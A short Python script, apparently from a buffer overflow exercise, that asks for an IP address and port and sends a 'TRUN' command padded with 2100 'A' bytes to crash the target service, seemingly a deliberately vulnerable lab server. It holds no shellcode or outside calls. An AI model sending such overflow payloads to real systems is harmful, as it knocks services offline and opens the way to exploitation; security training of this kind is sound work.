#!/usr/bin/python3

import sys,socket

#user input
ip_address=input("Enter the IP address\n")
port_number=input("Enter the port number\n")

def lines():
    print("*"*50)
if len(ip_address)==0 or len(port_number)==0:
    lines()
    print("User input missing, kindly check")
else:
    #buffer size --> 2100
    buffer_size=2100
    #connect to ip and port number
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #print buffer size
    print(f"Sending buffer -->{buffer_size}")
    #connect to ip adn port number
    s.connect((ip_address, int(port_number)))
    #send buffer
    s.send((b"TRUN /.:/ " + b"A" * buffer_size))
    s.close()

